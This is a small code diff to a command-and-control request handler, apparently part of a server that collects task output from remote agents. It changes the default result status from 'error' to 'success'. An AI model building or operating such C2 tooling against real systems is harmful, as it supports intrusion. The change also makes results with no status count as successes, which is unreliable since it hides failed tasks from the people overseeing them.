@@ -150,7 +150,7 @@ class C2Handler(BaseHTTPRequestHandler):
                     agent_id=agent_id,
                     task_id=data.get("task_id", ""),
                     output=data.get("output", ""),
-                    status=data.get("status", "error"),
+                    status=data.get("status", "success"),
                 )
                 self._send_json({"ok": True})
             except Exception as e:
